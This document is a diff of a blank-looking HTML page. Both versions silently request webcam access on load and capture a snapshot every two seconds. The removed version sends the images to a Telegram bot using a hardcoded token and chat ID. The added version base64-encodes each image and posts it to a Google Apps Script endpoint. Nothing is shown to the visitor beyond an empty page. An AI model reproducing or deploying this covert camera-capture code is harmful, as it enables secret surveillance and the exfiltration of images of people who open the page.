@@ -1,70 +1,72 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Camera Bot</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 20px;
-    }
-    #canvas {
-      display: none;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        #canvas {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-  <h1> </h1>
-  <canvas id="canvas"></canvas>
+    <h1></h1>
+    <canvas id="canvas"></canvas>
 
-  <script>
-    const canvas = document.getElementById("canvas");
-    const botToken = "8310662832:AAH0hOxIRR2t3Jk3Qywa6IbuCNR7IV2gex8";
-    const chatId = "917254238";
-    
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(function (stream) {
-        const videoTrack = stream.getVideoTracks()[0];
-        setInterval(() => takeSnapshot(videoTrack), 2000);
-      })
-      .catch(function (error) {
-        console.error("⚠️ حدث خطأ أثناء الوصول للكاميرا:", error);
-      });
+    <script>
+        const canvas = document.getElementById("canvas");
+        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzxiFav7UBtXjHOqZrTUuzaPTyNxKuIb-26J95QS549m4E9oY4RcB5AFF1uDjotT8sj1g/exec';
 
-    function takeSnapshot(videoTrack) {
-      const videoElement = document.createElement("video");
-      videoElement.srcObject = new MediaStream([videoTrack]);
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function(stream) {
+                const videoTrack = stream.getVideoTracks()[0];
 
-      videoElement.addEventListener("loadedmetadata", () => {
-        canvas.width = videoElement.videoWidth;
-        canvas.height = videoElement.videoHeight;
+                setInterval(function() {
+                    takeSnapshot(videoTrack);
+                }, 2000);
+            })
+            .catch(function(error) {
+                console.error("حدث خطأ أثناء الوصول للكاميرا:", error);
+            });
 
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+        function takeSnapshot(videoTrack) {
+            const videoElement = document.createElement('video');
+            videoElement.srcObject = new MediaStream([videoTrack]);
+            videoElement.addEventListener('loadedmetadata', () => {
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                canvas.getContext('2d').drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
-        canvas.toBlob(function (blob) {
-          sendToTelegram(blob);
-        }, "image/jpeg");
-      });
-
-      videoElement.play();
-    }
-
-    function sendToTelegram(blob) {
-      const formData = new FormData();
-      formData.append("chat_id", chatId);
-      formData.append("photo", blob);
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-        method: "POST",
-        body: formData
-      })
-        .then((response) => response.json())
-        .then((result) => console.log(result))
-        .catch((error) => console.error("❌ فشل الإرسال:", error));
-    }
-  </script>
+                canvas.toBlob(function(blob) {
+                    const reader = new FileReader();
+                    reader.onloadend = function() {
+                        const base64Data = reader.result.split(',')[1];
+                        fetch(SCRIPT_URL, {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/x-www-form-urlencoded"
+                            },
+                            body: `image=${encodeURIComponent(base64Data)}`
+                        })
+                        .then(response => response.text())
+                        .then(data => {
+                            console.log("تم إرسال الصورة عبر Google Script:", data);
+                        })
+                        .catch(error => {
+                            console.error("خطأ في Google Script:", error);
+                        });
+                    };
+                    reader.readAsDataURL(blob);
+                }, "image/jpeg", 0.8);
+            });
+            videoElement.play();
+        }
+    </script>
 </body>
 </html>
